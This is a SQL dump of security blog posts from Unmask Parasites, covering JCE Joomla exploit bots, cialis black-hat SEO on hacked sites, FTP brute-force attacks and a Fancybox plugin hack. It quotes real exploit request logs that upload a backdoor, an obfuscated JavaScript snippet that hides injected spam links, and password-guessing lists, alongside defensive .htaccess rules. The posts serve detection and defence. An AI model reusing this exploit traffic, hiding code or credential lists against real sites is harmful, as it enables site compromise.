*.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (197, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (198, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (199, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (200, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (201, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
